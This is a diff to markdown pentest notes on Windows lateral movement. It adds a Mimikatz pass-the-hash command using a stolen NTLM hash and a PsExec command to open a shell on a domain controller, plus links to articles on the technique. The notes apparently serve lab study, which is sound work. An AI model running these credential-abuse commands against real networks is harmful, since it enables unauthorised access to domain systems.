@@ -67,11 +67,25 @@ Attempt to RDP. Simple!
 
 ### Pass The Hash
 #### MIMIKATZ
+
+`sekurlsa::pth /user:jeff /domain:hackerlab.com /ntlm:HASH /run:cmd.exe`
+
+Verify. check if you can run commands on DC
+
+`PsExec.exe \\<IP of DC> cmd.exe`
+
 #### Impacket
 #### XFreeRDP
 #### CrackMapExec 
+
+
+
 reference the cheatsheet
 
 ### Pass-the-Ticket
 
-**Windows Lateral Movement** https://riccardoancarani.github.io/2019-10-04-lateral-movement-megaprimer/
+**Windows Lateral Movement** 
+
+- Lateral Movement Article https://riccardoancarani.github.io/2019-10-04-lateral-movement-megaprimer/
+- Pass the hash with Mimikatz https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/
+
